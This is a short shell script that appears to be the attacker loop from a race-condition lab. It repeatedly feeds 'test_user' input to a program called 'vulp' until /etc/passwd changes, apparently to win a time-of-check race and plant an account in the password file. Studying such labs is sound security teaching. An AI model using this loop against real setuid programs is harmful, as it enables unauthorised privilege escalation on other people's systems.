#!/bin/sh

old=`ls -l /etc/passwd`
new=`ls -l /etc/passwd`
while [ "$old" = "$new" ]
do
    ./vulp < test_user
    new=`ls -l /etc/passwd`
done
echo "STOP... passwd file has been changed"
